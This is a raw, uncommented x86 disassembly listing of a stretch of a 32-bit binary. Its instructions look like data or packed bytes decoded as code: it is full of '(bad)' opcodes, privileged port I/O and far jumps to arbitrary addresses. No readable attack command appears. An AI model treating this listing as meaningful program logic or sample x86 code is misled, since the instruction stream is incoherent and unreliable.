  40c849:	out    dx,al
  40c84a:	push   ebp
  40c84b:	in     eax,0x2
  40c84d:	dec    ecx
  40c84e:	inc    esi
  40c84f:	add    dl,dl
  40c851:	push   0xffffffa3
  40c853:	mov    ds:0xace9aa4a,eax
  40c858:	shl    edx,cl
  40c85a:	shr    BYTE PTR [eax],cl
  40c85c:	push   esp
  40c85d:	cmp    esp,eax
  40c85f:	inc    esi
  40c860:	or     DWORD PTR [ebx],ebp
  40c862:	cmp    ch,BYTE PTR [ecx-0x2b41980c]
  40c868:	mov    dh,0xa8
  40c86a:	mul    BYTE PTR [ebx]
  40c86c:	or     al,0x1c
  40c86e:	mov    eax,ds:0x3c1f52b2
  40c873:	cdq    
  40c874:	xor    ebp,DWORD PTR [ebx+eiz*8+0x6dc3bfd4]
  40c87b:	loop   0x40c8e5
  40c87d:	add    BYTE PTR [ecx+0x1ac17de8],cl
  40c883:	jle    0x40c8da
  40c885:	(bad)  
  40c886:	pushw  ss
  40c888:	in     eax,0xfc
  40c88a:	sbb    esp,edi
  40c88c:	sub    BYTE PTR [ebx-0x9],ch
  40c88f:	add    eax,0x2a40f7d6
  40c894:	cld    
  40c895:	mov    ds:0x9a42fa79,eax
  40c89a:	nop
  40c89b:	hlt    
  40c89c:	int3   
  40c89d:	shl    DWORD PTR [ebx-0x21b0d729],0xb4
  40c8a4:	arpl   di,cx
  40c8a6:	out    0x5a,al
  40c8a8:	bnd jbe 0x40c83d
  40c8ab:	jl     0x40c8fd
  40c8ad:	rcr    DWORD PTR [esi-0x24fe841f],0x4e
  40c8b4:	imul   ebx,esi,0x45d255e
  40c8ba:	xchg   esi,eax
  40c8bb:	sub    cl,BYTE PTR [eax+ebp*2-0x21f4b451]
  40c8c2:	pop    es
  40c8c3:	cmc    
  40c8c4:	push   ebx
  40c8c5:	pop    esi
  40c8c6:	fldln2 
  40c8c8:	mov    esp,0xf935c20a
  40c8cd:	push   0xffffff8b
  40c8cf:	push   ss
  40c8d0:	arpl   WORD PTR [edi-0x34],cx
  40c8d3:	jno    0x40c89f
  40c8d5:	shl    DWORD PTR [esi-0x70],0xfc
  40c8d9:	sbb    al,0xa2
  40c8db:	mov    eax,ds:0x412cd9a7
  40c8e0:	das    
  40c8e1:	xchg   ecx,eax
  40c8e2:	fcomp  DWORD PTR [ecx]
  40c8e4:	loopne 0x40c86b
  40c8e6:	(bad)  
  40c8e7:	mov    ebx,0x3774cd05
  40c8ec:	push   edx
  40c8ed:	pop    ss
  40c8ee:	shr    cl,0x34
  40c8f1:	pusha  
  40c8f2:	js     0x40c895
  40c8f4:	retf   
  40c8f5:	and    DWORD PTR [esi-0x3d],0x51
  40c8f9:	xchg   ebx,eax
  40c8fa:	cdq    
  40c8fb:	mov    esp,0x6f02874d
  40c900:	cmc    
  40c901:	pop    esi
  40c902:	data16 mov bl,ah
  40c905:	sub    eax,0x6ae1c801
  40c90a:	add    BYTE PTR es:[eax+0x3a098ae8],0x11
  40c912:	xchg   sp,ax
  40c914:	cmp    eax,0x67ca8a74
  40c919:	fild   QWORD PTR [edi-0x7f]
  40c91c:	in     eax,0x70
  40c91e:	fld    DWORD PTR [edi+0x61306ac7]
  40c924:	(bad)  
  40c926:	and    al,0x76
  40c928:	push   ebx
  40c929:	jnp    0x40c8f1
  40c92b:	icebp  
  40c92c:	addr16 and al,0x55
  40c92f:	hlt    
  40c930:	sahf   
  40c931:	shr    BYTE PTR [edi],cl
  40c933:	ret    
  40c934:	in     eax,0xf2
  40c936:	push   es
  40c937:	fwait
  40c938:	cwde   
  40c939:	or     DWORD PTR [eax+0x40],edi
  40c93c:	pop    ss
  40c93d:	into   
  40c93e:	bound  edx,QWORD PTR gs:[ecx]
  40c941:	retf   
  40c942:	popa   
  40c943:	outs   dx,BYTE PTR ds:[esi]
  40c944:	mov    al,ds:0xc9951459
  40c949:	add    DWORD PTR [edi],ebp
  40c94b:	xor    al,0x8
  40c94d:	call   0x9819:0x16321b0a
  40c954:	stos   DWORD PTR es:[edi],eax
  40c955:	out    dx,al
  40c956:	mov    ecx,0xe52976ab
  40c95b:	jns    0x40c90c
  40c95d:	addr16 test al,0x6a
  40c960:	stos   BYTE PTR es:[edi],al
  40c961:	imul   edx,DWORD PTR [ecx+0x37f68d2c],0x661aee15
  40c96b:	jp     0x40c9e9
  40c96d:	sub    bh,bh
  40c96f:	leave  
  40c970:	or     bh,BYTE PTR ds:0x6ae3a416
  40c976:	test   al,0x85
  40c978:	mov    edx,0x1fc140c7
  40c97d:	and    BYTE PTR [esi+0x11],0x24
  40c981:	test   DWORD PTR [ebx+ecx*1+0x1925012b],0x40dbc769
  40c98c:	mov    ebp,0x53565e77
  40c991:	or     al,0x14
  40c993:	inc    ebx
  40c994:	sbb    ebp,DWORD PTR [edi]
  40c996:	(bad)  
  40c997:	sub    eax,0xf1e56967
  40c99c:	neg    dl
  40c99e:	pop    ebx
  40c99f:	pop    esp
  40c9a0:	sahf   
  40c9a1:	cmp    DWORD PTR [edi-0x79],0xc
  40c9a5:	add    eax,0x3ef719e3
  40c9aa:	dec    ebp
  40c9ab:	adc    ch,BYTE PTR [esi+0x0]
  40c9ae:	mov    edx,0x9c91f603
  40c9b3:	sub    ecx,esp
  40c9b5:	std    
  40c9b6:	iret   
  40c9b7:	loop   0x40ca1d
  40c9b9:	add    edi,DWORD PTR [edi+ebx*4-0x452f286d]
  40c9c0:	cmp    esp,DWORD PTR [ebx]
  40c9c2:	(bad)  
  40c9c4:	stos   DWORD PTR es:[edi],eax
  40c9c5:	ja     0x40c9c0
  40c9c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9c8:	ins    BYTE PTR es:[edi],dx
  40c9c9:	icebp  
  40c9ca:	repz cmp al,BYTE PTR ss:[ebp+0x2c24d466]
  40c9d2:	mov    edx,0x2eccc764
  40c9d7:	sbb    DWORD PTR [ebx+0x18a69f52],edi
  40c9dd:	adc    edi,DWORD PTR [ebx+0x2b]
  40c9e0:	push   ebx
  40c9e1:	add    ah,0x33
  40c9e4:	inc    BYTE PTR [ecx-0x4b]
  40c9e7:	fisttp DWORD PTR [esi-0x59b32297]
  40c9ed:	nop
  40c9ee:	xchg   edx,eax
  40c9ef:	jb     0x40ca5d
  40c9f1:	mov    edx,0xab533b6f
  40c9f6:	maxps  xmm3,XMMWORD PTR [edi+ebx*1+0x695d1d6e]
  40c9fe:	mov    esi,0x199ac896
  40ca03:	enter  0x4a7,0x7b
  40ca07:	mov    dl,0x19
  40ca09:	xchg   esi,eax
  40ca0a:	cmp    ebp,DWORD PTR [eax]
  40ca0c:	test   BYTE PTR [ecx-0x54d60c6f],ch
  40ca12:	pop    es
  40ca13:	sbb    bh,cl
  40ca15:	jno    0x40ca6a
  40ca17:	retf   0xd132
  40ca1a:	mov    al,ds:0x6511df11
  40ca1f:	data16 add al,0xd8
  40ca22:	mov    edi,0x8a12e1af
  40ca27:	pushf  
  40ca28:	iret   
  40ca29:	push   0x6e
  40ca2b:	test   al,al
  40ca2d:	or     eax,0xa59d4cf2
  40ca32:	jns    0x40c9e9
  40ca34:	xchg   ebx,eax
  40ca35:	and    BYTE PTR [edi],bl
  40ca37:	in     eax,dx
  40ca38:	mov    bh,0x8f
  40ca3a:	cmp    BYTE PTR [ebp+0x36aa0219],bl
  40ca40:	sbb    BYTE PTR [ebx],0xd2
  40ca43:	mov    DWORD PTR [edx],edx
  40ca45:	mov    esp,0x6b5377a8
  40ca4a:	ins    DWORD PTR es:[edi],dx
  40ca4b:	adc    BYTE PTR [ebx-0x194d84fe],dh
  40ca51:	push   0x7f
  40ca53:	in     al,dx
  40ca54:	adc    DWORD PTR [ecx-0x5e],edx
  40ca57:	cwde   
  40ca58:	mov    esi,0xee6a7513
  40ca5d:	and    al,0x19
  40ca5f:	jl     0x40ca74
  40ca61:	mov    edi,0xc6d08b39
  40ca66:	dec    edx
  40ca67:	sbb    BYTE PTR [esi+esi*4],al
  40ca6a:	ss pop edx
  40ca6c:	sbb    al,0x6c
  40ca6e:	not    BYTE PTR [edi]
  40ca70:	mov    edi,0x6fe1e191
  40ca75:	mov    cl,BYTE PTR [ebx-0x2e]
  40ca78:	push   esp
  40ca79:	int    0x8d
  40ca7b:	sbb    DWORD PTR [edx+0x35fc512b],ebp
  40ca81:	push   0x7f
  40ca83:	fistp  QWORD PTR [ebp+esi*8+0x7a110eff]
  40ca8a:	or     eax,0x88357acf
  40ca8f:	xchg   esp,eax
  40ca90:	test   ecx,ecx
  40ca92:	mov    al,ds:0x788ea312
  40ca97:	sbb    BYTE PTR [esi+eiz*4],dl
  40ca9a:	adc    eax,0x32fe87e2
  40ca9f:	jbe    0xd597920c
  40caa5:	inc    ebx
  40caa6:	xchg   BYTE PTR [edx+0x6e0750a4],cl
  40caac:	and    esi,DWORD PTR [esi-0x6a]
  40caaf:	shr    BYTE PTR [esi],cl
  40cab1:	loop   0x40ca8a
  40cab3:	fs xchg ecx,eax
  40cab5:	test   BYTE PTR [esi],al
  40cab7:	out    0x23,eax
  40cab9:	ret    0x28d6
  40cabc:	push   ebx
  40cabd:	(bad)  
  40cabe:	cmp    al,0x22
  40cac0:	out    dx,eax
  40cac1:	arpl   WORD PTR [eax],dx
  40cac3:	push   es
  40cac4:	clc    
  40cac5:	push   0xfffffffb
  40cac7:	cmp    BYTE PTR [eax-0x6166728f],bl
  40cacd:	inc    esp
  40cace:	data16 jno 0x40cafb
  40cad1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cad2:	push   0x5
  40cad4:	or     eax,0xc6ded4e7
  40cad9:	shl    BYTE PTR [esi-0x7b],cl
  40cadc:	pop    edx
  40cadd:	mov    esp,0xc5d7ab5
  40cae2:	or     ax,0xc0c3
  40cae6:	cmp    eax,0x28ce494f
  40caeb:	(bad)  
  40caec:	or     al,0x31
  40caee:	in     eax,dx
  40caef:	mov    cl,0x9f
  40caf1:	in     eax,dx
  40caf2:	mov    dh,0x9
  40caf4:	std    
  40caf5:	xchg   edi,eax
  40caf6:	popaw  
  40caf8:	stos   DWORD PTR es:[edi],eax
  40caf9:	sti    
  40cafa:	xchg   ecx,eax
  40cafb:	and    BYTE PTR [ecx+0x4c],0xce
  40caff:	mov    eax,0xd6372351
  40cb04:	and    bh,BYTE PTR [esi-0x33]
  40cb07:	mov    ds:0xdab22abf,al
  40cb0c:	push   ebp
  40cb0d:	sub    eax,0x977b4666
  40cb12:	aad    0xf9
  40cb14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb15:	inc    edx
  40cb16:	jne    0x40cb33
  40cb18:	push   cs
  40cb19:	aas    
  40cb1a:	icebp  
  40cb1b:	xor    cl,dl
  40cb1d:	inc    DWORD PTR [ebx-0x42aac9b]
  40cb23:	push   ebp
  40cb24:	push   esp
  40cb25:	add    DWORD PTR [edi+0x2b698e64],edi
  40cb2b:	in     eax,0xdf
  40cb2d:	xchg   edx,eax
  40cb2e:	fdiv   QWORD PTR [eax]
  40cb30:	cmc    
  40cb31:	bound  ebp,QWORD PTR [edx+ecx*1]
  40cb34:	add    eax,0xfcb0846b
  40cb39:	sub    edi,esi
  40cb3b:	mov    ds:0xddeaf182,al
  40cb40:	mov    dl,0x4
  40cb42:	jns    0x40cacb
  40cb44:	popa   
  40cb45:	hlt    
  40cb46:	push   esp
  40cb47:	out    0xbe,al
  40cb49:	cmp    edx,ebx
  40cb4b:	mov    al,0x45
  40cb4d:	sub    DWORD PTR [ebx+0x25b16294],0xffffffe9
  40cb54:	adc    DWORD PTR [edx],ebp
  40cb56:	jg     0x40cae3
  40cb58:	int3   
  40cb59:	add    eax,0x9971cbd6
  40cb5e:	xor    BYTE PTR [esi-0x5d865f49],bh
  40cb64:	xchg   BYTE PTR [edi+0x4d],ch
  40cb67:	push   cs
  40cb68:	dec    edi
  40cb69:	jecxz  0x40cbe2
  40cb6b:	sbb    edx,edi
  40cb6d:	or     al,0xeb
  40cb6f:	jns    0x40cb8a
  40cb71:	add    BYTE PTR [edi+0x232a52b9],dh
  40cb77:	and    eax,DWORD PTR [ebp-0x51]
  40cb7a:	adc    al,dl
  40cb7c:	aaa    
  40cb7d:	xor    BYTE PTR [ebx+ecx*4],dl
  40cb80:	ins    BYTE PTR es:[edi],dx
  40cb81:	xchg   esi,eax
  40cb82:	jb     0x40cb3e
  40cb84:	retf   0x409e
  40cb87:	sbb    BYTE PTR [edx],ah
  40cb89:	daa    
  40cb8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb8b:	or     al,0x49
  40cb8d:	call   0xf4ae:0xfaa30265
  40cb94:	inc    edx
  40cb95:	retf   0xb15b
  40cb98:	push   esi
  40cb99:	push   ecx
  40cb9a:	fcomp  DWORD PTR [edi]
  40cb9c:	(bad)  
  40cb9d:	das    
  40cb9e:	xor    DWORD PTR [esp+ecx*2-0x1bb0be47],esi
  40cba5:	mov    edx,0x75effd7e
  40cbaa:	jns    0x40cbe7
  40cbac:	cs adc eax,0x90da6b8b
  40cbb2:	neg    DWORD PTR [edi]
  40cbb4:	imul   ebx,DWORD PTR [edi],0xfffffff1
  40cbb7:	mov    edx,0x3a6992a
  40cbbc:	js     0x40cc2a
  40cbbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbbf:	push   edi
  40cbc0:	push   ebx
  40cbc1:	mov    bl,0xe
  40cbc3:	or     eax,0xda4a673b
  40cbc8:	sub    BYTE PTR [ecx+0x64],0xad
  40cbcc:	je     0x40cc28
  40cbce:	add    al,0x92
  40cbd0:	pop    ss
  40cbd1:	sub    edi,DWORD PTR [eax]
  40cbd3:	stos   BYTE PTR es:[edi],al
  40cbd4:	mov    esi,0x38d54eea
  40cbd9:	cmp    al,0xf5
  40cbdb:	mov    ah,0xb3
  40cbdd:	imul   edi,DWORD PTR [eax+0xb717bf5],0x49465cdc
  40cbe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbe8:	inc    ecx
  40cbe9:	sbb    cl,dl
  40cbeb:	adc    BYTE PTR [eax-0x5c],ch
  40cbee:	sub    DWORD PTR [ecx-0x48],edx
  40cbf1:	scas   eax,DWORD PTR es:[edi]
  40cbf2:	mov    edx,0xceccbe19
  40cbf7:	call   0xbb53:0xf448e35d
  40cbfe:	dec    ecx
  40cbff:	popa   
  40cc00:	sub    ebp,DWORD PTR [esi]
  40cc02:	and    BYTE PTR ds:0xc84b6abc,dh
  40cc08:	sbb    al,0x42
  40cc0a:	mov    ebx,0x2d2327ce
  40cc0f:	sbb    ah,dh
  40cc11:	add    DWORD PTR [edi],esp
  40cc13:	mov    dl,0x7d
  40cc15:	jecxz  0x40cc0d
  40cc17:	cmp    ch,ah
  40cc19:	jmp    0x4524aac5
  40cc1e:	aad    0xa8
  40cc20:	dec    ecx
  40cc21:	cmp    DWORD PTR [ebp-0x59],ecx
  40cc24:	mov    bl,0xfd
  40cc26:	ja     0x40cbaa
  40cc28:	inc    ecx
  40cc29:	aam    0x66
  40cc2b:	xchg   ebx,eax
  40cc2c:	pop    ebx
  40cc2d:	or     DWORD PTR [ecx-0x40],ebp
  40cc30:	sti    
  40cc31:	ret    
  40cc32:	adc    eax,0x29783a1b
  40cc37:	dec    ecx
  40cc38:	fldcw  WORD PTR [esi-0x6eac9433]
  40cc3e:	icebp  
  40cc3f:	mov    esp,0x4094df47
  40cc44:	mov    DWORD PTR [ebx+0x2e],ebp
  40cc47:	mov    al,ds:0x51503b98
  40cc4c:	xchg   ebx,eax
  40cc4d:	mov    bh,0x64
  40cc4f:	imul   eax,DWORD PTR [ebp+eax*4+0x9e71b7a],0xffffffa4
  40cc57:	ffree  st(3)
  40cc59:	retf   
  40cc5a:	mov    ah,0x19
  40cc5c:	std    
  40cc5d:	and    al,0x3b
  40cc5f:	cli    
  40cc60:	dec    ebx
  40cc61:	sub    eax,0x1d5099f4
  40cc66:	cmp    BYTE PTR [ebx],ah
  40cc68:	and    eax,0xa60b675e
  40cc6d:	mov    ah,0x43
  40cc6f:	or     al,0x28
  40cc71:	ins    DWORD PTR es:[edi],dx
  40cc72:	mov    esp,edx
  40cc74:	and    ah,BYTE PTR [esi+0x4e]
  40cc77:	xchg   esp,eax
  40cc78:	add    DWORD PTR [esi+edx*4-0x57ee85ca],eax
  40cc7f:	ins    BYTE PTR es:[edi],dx
  40cc80:	push   edx
  40cc81:	mov    eax,0x40d10914
  40cc86:	jmp    0x40cce5
  40cc88:	test   BYTE PTR [edi],bl
  40cc8a:	fisub  DWORD PTR [edx]
  40cc8c:	push   ebx
  40cc8d:	out    0xf1,al
  40cc8f:	sbb    ch,dl
  40cc91:	ret    
  40cc92:	cwd    
  40cc94:	outs   dx,BYTE PTR ds:[esi]
  40cc95:	mov    cl,0x3c
  40cc97:	pop    edx
  40cc98:	iret   
  40cc99:	js     0x40cc2b
  40cc9b:	sbb    eax,esi
  40cc9d:	lahf   
  40cc9e:	dec    edi
  40cc9f:	pusha  
  40cca0:	stos   BYTE PTR es:[edi],al
  40cca1:	add    ah,BYTE PTR [eax+0x42c55305]
  40cca7:	jecxz  0x40cc40
  40cca9:	mov    dl,BYTE PTR [edx-0xc]
  40ccac:	adc    eax,0xa8f50e6b
  40ccb1:	add    esp,DWORD PTR [ebp-0x33]
  40ccb4:	mov    cl,0x83
  40ccb6:	gs lock fadd st(0),st
  40ccba:	mov    dl,0x4c
  40ccbc:	jno    0x40ccaf
  40ccbe:	fwait
  40ccbf:	ja     0x40ccf1
  40ccc1:	or     BYTE PTR [esi+0x5b],bh
  40ccc4:	scas   al,BYTE PTR es:[edi]
  40ccc5:	and    al,BYTE PTR [edi+0x18]
  40ccc8:	in     eax,0xcb
  40ccca:	scas   al,BYTE PTR es:[edi]
  40cccb:	sti    
  40cccc:	or     al,0x4b
  40ccce:	jns    0x40ccd0
  40ccd0:	mov    BYTE PTR [esi],bl
  40ccd2:	add    DWORD PTR [edi+0x1879d334],ecx
  40ccd8:	dec    esi
  40ccd9:	aaa    
  40ccda:	sahf   
  40ccdb:	mov    al,ds:0xa14db6db
  40cce0:	inc    ebx
  40cce1:	mov    WORD PTR [ecx-0x29],?
  40cce4:	xchg   ecx,eax
  40cce5:	std    
  40cce6:	ds add esi,0xffffff87
  40ccea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cceb:	lods   al,BYTE PTR ds:[esi]
  40ccec:	loope  0x40cd55
  40ccee:	icebp  
  40ccef:	dec    esp
  40ccf0:	push   ebx
  40ccf1:	cs sti 
  40ccf3:	jns    0x40cc78
  40ccf5:	pusha  
  40ccf6:	cmp    BYTE PTR [eax+0x3a],bl
  40ccf9:	jmp    0x7d2a:0x254374df
  40cd00:	pop    ecx
  40cd01:	dec    esi
  40cd02:	js     0x40cd28
  40cd04:	sub    ebp,DWORD PTR [ebx-0x2e3ee2c7]
  40cd0a:	inc    edx
  40cd0b:	cli    
  40cd0c:	push   ebx
  40cd0d:	cld    
  40cd0e:	mov    ah,0x92
  40cd10:	jmp    0xd66b:0xbccaa51
  40cd17:	es pop esp
  40cd19:	sahf   
  40cd1a:	retf   
  40cd1b:	fistp  QWORD PTR [edx]
  40cd1d:	jmp    DWORD PTR [esi+0x77]
  40cd20:	imul   edx,DWORD PTR [ecx],0x4e708c65
  40cd26:	mov    DWORD PTR [ecx],ebx
  40cd28:	es nop
  40cd2a:	outs   dx,DWORD PTR ds:[esi]
  40cd2b:	mov    WORD PTR [ebp-0x3c],cs
  40cd2e:	sub    BYTE PTR [eax+0x57677c53],bl
  40cd34:	cmp    eax,esi
  40cd36:	xor    dh,BYTE PTR [ecx+0x44806b02]
  40cd3c:	ficom  WORD PTR [esi+0x6f4e1011]
  40cd42:	jno    0x40cd4c
  40cd44:	stc    
  40cd45:	mov    edx,fs
  40cd47:	cmp    BYTE PTR [ebx-0x77],dl
  40cd4a:	cmc    
  40cd4b:	mov    al,BYTE PTR [esi+0x7540ad69]
  40cd51:	adc    ecx,DWORD PTR [ecx]
  40cd53:	std    
  40cd54:	ja     0x40cce5
  40cd56:	jo     0x40cd95
  40cd58:	pop    eax
  40cd59:	fcom   QWORD PTR [edi+0x34]
  40cd5c:	in     eax,0x2a
  40cd5e:	call   0xdfb68a84
  40cd63:	sbb    eax,eax
  40cd65:	test   DWORD PTR [esi+eiz*1+0x59227c49],0x8eea0953
  40cd70:	cmpxchg DWORD PTR [ecx-0x4a],eax
  40cd74:	sti    
  40cd75:	push   0xffffffdf
  40cd77:	(bad)  
  40cd79:	hlt    
  40cd7a:	push   ecx
  40cd7b:	xchg   edx,eax
  40cd7c:	push   es
  40cd7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd7e:	jns    0x40cd8b
  40cd80:	push   0xffffffd8
  40cd82:	test   al,0x78
  40cd84:	fdiv   DWORD PTR [ecx-0x3a]
  40cd87:	lods   eax,DWORD PTR ds:[esi]
  40cd88:	xor    al,0x54
  40cd8a:	mov    WORD PTR [ebx-0x56989249],ds
  40cd90:	cmp    ebx,DWORD PTR [ebx+0x77677d7f]
  40cd96:	mov    ebp,0x956a4a97
  40cd9b:	(bad)  
  40cd9c:	gs xor edx,edi
  40cd9f:	iret   
  40cda0:	test   ecx,0x5fb22262
  40cda6:	mov    al,0x7c
  40cda8:	ror    ebx,cl
  40cdaa:	(bad)  
  40cdac:	sbb    eax,0xeb2c7b6c
  40cdb1:	sar    edx,cl
  40cdb3:	lds    edx,FWORD PTR [edi+0x5365f115]
  40cdb9:	xchg   DWORD PTR [edi-0x3c],edi
  40cdbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdbd:	arpl   WORD PTR [bx+si+0x6974],si
  40cdc2:	or     bh,bh
  40cdc4:	lods   eax,DWORD PTR ds:[esi]
  40cdc5:	nop
  40cdc6:	pop    ss
  40cdc7:	(bad)  
  40cdc9:	dec    esi
  40cdca:	jns    0x40cde3
  40cdcc:	(bad)  
  40cdcd:	out    0x88,eax
  40cdcf:	jo     0x40cd8e
  40cdd1:	adc    dh,BYTE PTR [esi+0x1b]
  40cdd4:	push   edi
  40cdd5:	add    ah,BYTE PTR [ebp+eax*2+0x11]
  40cdd9:	lar    edi,WORD PTR [esi+0x53]
  40cddd:	addr16 pushf 
  40cddf:	iret   
  40cde0:	or     esi,ebp
  40cde2:	add    BYTE PTR es:[edi-0x4fe5d96],dh
  40cde9:	sar    eax,1
  40cdeb:	ret    
  40cdec:	push   ecx
  40cded:	mov    edx,0x16b3164b
  40cdf2:	jae    0x40ce0f
  40cdf4:	cmp    BYTE PTR [esi+0x6af83421],ah
  40cdfa:	sub    edi,eax
  40cdfc:	ja     0x40ce72
  40cdfe:	retf   0x121b
  40ce01:	les    ebp,FWORD PTR [eax+0x5d]
  40ce04:	ret    
  40ce05:	cmp    esi,DWORD PTR [ecx+0x13]
  40ce08:	(bad)  
  40ce09:	not    BYTE PTR [esp+edx*8]
  40ce0c:	test   BYTE PTR [ecx+0x26d0a81],cl
  40ce12:	jnp    0x40ce60
  40ce14:	test   DWORD PTR [ebp-0x64804b87],esp
  40ce1a:	out    dx,al
  40ce1b:	call   0xd30f:0x90b4d51
  40ce22:	lds    edi,FWORD PTR [ecx-0x41]
  40ce25:	ds retf 0x4e19
  40ce29:	sub    ah,BYTE PTR [ecx+0x71]
  40ce2c:	cmp    BYTE PTR [ecx-0x2f758456],bh
  40ce32:	das    
  40ce33:	sbb    DWORD PTR [eax+ebx*2+0x46],ebx
  40ce37:	dec    edx
  40ce38:	sbb    bl,BYTE PTR [eax+0x4f1d87f4]
  40ce3e:	outs   dx,DWORD PTR ds:[esi]
  40ce3f:	data16 lods al,BYTE PTR es:[esi]
  40ce42:	retf   
  40ce43:	or     bl,ah
  40ce45:	jae    0x40ce76
  40ce47:	jns    0x40ce83
  40ce49:	inc    esi
  40ce4a:	sbb    DWORD PTR [ecx],esp
  40ce4c:	xor    eax,DWORD PTR [edx+0x71afa9a6]
  40ce52:	jle    0x40ce5b
  40ce54:	xor    eax,0x816a7d6a
  40ce59:	fwait
  40ce5a:	jmp    0x40ce95
  40ce5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce5d:	xchg   ecx,eax
  40ce5e:	data16 rol dl,0xc5
  40ce62:	adc    DWORD PTR [ebx+eax*1-0x3ae65213],eax
  40ce69:	dec    edx
  40ce6a:	push   ds
  40ce6b:	sar    BYTE PTR [ebp+0x56],cl
  40ce6e:	xor    BYTE PTR [ecx+0x4c],0x47
  40ce72:	aam    0xf4
  40ce74:	pusha  
  40ce75:	fst    DWORD PTR [ebp-0x75]
  40ce78:	nop
  40ce79:	mov    eax,ds:0x397311e8
  40ce7e:	mov    BYTE PTR [ebx+0x3854866c],ch
  40ce84:	jae    0x40ce62
  40ce86:	adc    al,BYTE PTR [eax-0x67868312]
  40ce8c:	je     0x40ceff
  40ce8e:	jecxz  0x40ce9b
  40ce90:	sub    bl,BYTE PTR [ebp+0x371e19a1]
  40ce96:	jns    0x40ce9e
  40ce98:	jp     0x40cea9
  40ce9a:	addr16 out 0x53,al
  40ce9d:	dec    esp
  40ce9e:	xchg   esi,eax
  40ce9f:	sub    al,0x7f
  40cea1:	pop    ss
  40cea2:	mov    esi,0x3806a8af
  40cea7:	das    
  40cea8:	push   edi
  40cea9:	adc    al,0x31
  40ceab:	cdq    
  40ceac:	shl    DWORD PTR [eax-0x1facc74c],1
  40ceb2:	sub    ebx,DWORD PTR [esi+eiz*8-0x13]
  40ceb6:	push   cs
  40ceb7:	xchg   edi,eax
  40ceb8:	sub    DWORD PTR [ecx+0x34],0xffffffec
  40cebc:	icebp  
  40cebd:	jne    0x40cf32
  40cebf:	mov    ah,0x9
  40cec1:	adc    ecx,edi
  40cec3:	outs   dx,DWORD PTR ds:[esi]
  40cec4:	push   ebx
  40cec5:	mov    ecx,0xff864b54
  40ceca:	mov    esi,0x331c4d15
  40cecf:	cmp    ebp,DWORD PTR [ebx-0x1f]
  40ced2:	pushw  es
  40ced4:	ror    ebp,0x88
  40ced7:	test   BYTE PTR ds:[ebx],al
  40ceda:	fstp   DWORD PTR [ecx]
  40cedc:	test   eax,0xe36af129
  40cee1:	fadd   QWORD PTR [ebp+0x37118e19]
  40cee7:	and    al,0x7a
  40cee9:	in     eax,0xa4
  40ceeb:	es push ebx
  40ceed:	fwait
  40ceee:	xor    DWORD PTR [esi-0x55],ebx
  40cef1:	(bad)  
  40cef2:	dec    esp
  40cef3:	push   0x45236ac2
  40cef8:	scas   al,BYTE PTR es:[di]
  40cefa:	jb     0x40cf22
  40cefc:	mov    ebp,0x270b7142
  40cf01:	dec    ecx
  40cf02:	nop
  40cf03:	fs add eax,0xb6b96690
  40cf09:	sub    eax,0x69b3545c
  40cf0e:	fisttp DWORD PTR [edi-0x73186daf]
  40cf14:	xor    ah,BYTE PTR [ecx]
  40cf16:	mov    bp,0x8002
  40cf1a:	shl    DWORD PTR [ebp+0x19298593],0x57
  40cf21:	push   es
  40cf22:	in     eax,dx
  40cf23:	(bad)  
  40cf25:	xlat   BYTE PTR ds:[ebx]
  40cf26:	or     esi,ebp
  40cf28:	push   ebx
  40cf29:	pusha  
  40cf2a:	daa    
  40cf2b:	jp     0x40cedd
  40cf2d:	push   0xffffff96
  40cf2f:	dec    ecx
  40cf30:	mov    edi,0xd7865b6a
  40cf35:	cwde   
  40cf36:	ret    0xa35
  40cf39:	inc    ecx
  40cf3a:	data16 test dl,0xa1
  40cf3e:	dec    ebx
  40cf3f:	pop    esp
  40cf40:	icebp  
  40cf41:	xor    edx,DWORD PTR [edx-0x5a4f6be7]
  40cf47:	out    0xc0,eax
  40cf49:	shr    edx,cl
  40cf4b:	rcl    BYTE PTR [ebx+0x65],1
  40cf4e:	sub    al,0x9b
  40cf50:	(bad)  
  40cf51:	out    0xc8,al
  40cf53:	xchg   ebx,eax
  40cf54:	test   al,0x31
  40cf56:	sbb    eax,0x807f50a9
  40cf5b:	or     ebx,DWORD PTR [edx]
  40cf5d:	je     0x40cef8
  40cf5f:	ss or  eax,0x53689614
  40cf65:	push   edx
  40cf66:	ret    0x9d0a
  40cf69:	(bad)  
  40cf6b:	aad    0xc8
  40cf6d:	rcr    bl,cl
  40cf6f:	mov    edx,0x163eeb53
  40cf74:	push   ds
  40cf75:	adc    ebp,DWORD PTR [eax-0x4409ab4e]
  40cf7b:	xlat   BYTE PTR ds:[ebx]
  40cf7c:	mov    ds:0x7e894f29,eax
  40cf81:	mov    bl,0x5c
  40cf83:	(bad)  
  40cf84:	fs fs faddp st(4),st
  40cf88:	sahf   
  40cf89:	and    DWORD PTR [ebp+0x1a8353be],0x3a
  40cf90:	idiv   BYTE PTR [edx-0x7650e181]
  40cf96:	outs   dx,BYTE PTR ds:[esi]
  40cf97:	stos   DWORD PTR es:[edi],eax
  40cf98:	pop    esi
  40cf99:	bound  ebp,QWORD PTR [edx-0x6ffdccd4]
  40cf9f:	(bad)  
  40cfa0:	sub    DWORD PTR [edi+eiz*2],ebp
  40cfa3:	mov    WORD PTR [ebx+edx*2-0x12],fs
  40cfa7:	push   0xd1562caf
  40cfac:	mov    al,0xa3
  40cfae:	test   al,0x19
  40cfb0:	inc    edx
  40cfb1:	bound  ebx,QWORD PTR [ebp+0x21732311]
  40cfb7:	daa    
  40cfb8:	push   ebx
  40cfb9:	add    esp,DWORD PTR [eax]
  40cfbb:	(bad)  
  40cfbc:	cld    
  40cfbd:	outs   dx,DWORD PTR ds:[esi]
  40cfbe:	jbe    0x40cfc5
  40cfc0:	mov    BYTE PTR [ecx-0x17],ch
  40cfc3:	cmc    
  40cfc4:	inc    edi
  40cfc5:	or     esp,ecx
  40cfc7:	mov    esp,0x30a8c908
  40cfcc:	push   ebx
